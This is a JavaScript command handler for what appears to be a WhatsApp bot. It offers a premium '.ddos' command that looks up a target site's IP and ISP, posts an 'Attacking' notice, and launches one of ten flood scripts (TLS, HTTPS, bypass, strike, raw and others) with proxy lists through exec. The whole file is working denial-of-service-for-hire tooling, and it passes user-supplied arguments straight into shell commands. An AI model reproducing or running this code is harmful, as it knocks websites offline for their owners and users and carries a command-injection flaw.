const fetch = require('node-fetch')
const axios = require('axios')
const { exec } = require('child_process');
const { promisify } = require('util');
const url = require('url')

const cooldowns = new Map();

const handler = async (m, { conn, command, args }) => {
  if (args.length < 3) return conn.reply(m.chat, '\`\`\`[🔎] .ddos [url] [duration] [methods]\`\`\`', m);

  const blacklistedDomains = ['google.com', 'tesla.com', 'fbi.gov', 'youtube.com', 'lahelu.com'];

  if (blacklistedDomains.some(domain => args[0].includes(domain))) {
    return conn.reply(m.chat, '❌ Blacklisted Target.', m);
  }

  const target = args[0]
  const duration = args[1]
  const methods = args[2]
  const parsedUrl = new url.URL(target);

  const hostname = parsedUrl.hostname;

  const path = parsedUrl.pathname;
  const thumb = global.attacking
  const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)

  const result = response.data;

  const deepinfo = `\`Hostname: ${hostname}\`
\`Path: ${path}\`
\`Isp: ${result.isp}\`
\`Ip: ${result.query}\`
\`AS: ${result.as}\``
  const details = `│ Creator: PermenMD
│ Target: ${target}
│ Methods: ${methods}
│ Duration: ${duration}
${deepinfo}`
  
if ( methods === 'tls' ) {
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXTls.js ${target} ${duration} 100 4`)
} else if ( methods === 'ninja' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXNinja.js ${target} ${duration}`)
} else if ( methods === 'https' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXHttps.js ${target} ${duration} 4 100 proxy.txt`)
} else if ( methods === 'mix' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXMix.js ${target} ${duration} 100 4 proxy.txt`)
} else if ( methods === 'kill' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXKill.js ${target} ${duration} 100 4`)
} else if ( methods === 'rape' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXRape.js PermenMD ${duration} 4 proxy.txt 64 ${target}`)
} else if ( methods === 'browsers' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXBrowsers.js ${target} ${duration} 4 100`)
} else if ( methods === 'bypass' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXBypass.js ${target} ${duration} 100 4 proxy.txt`)
} else if ( methods === 'raw' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXRaw.js ${target} ${duration}`)
} else if ( methods === 'strike' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: false, 
title: `Attacking ${target}`,
body: `Mancing 500, 502, 503, CTO Wak`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXStrike.js GET ${target} ${duration} 4 90 proxy.txt --full --randrate`)
} else {
	m.reply(`_*Unknown Methods*_`)
}
  }

handler.help = ['ddos'].map(v => v + ' <url> <duration>');
handler.tags = ['tools', 'attack'];
handler.premium = true
handler.command = /^(ddos)$/i;
module.exports = handler
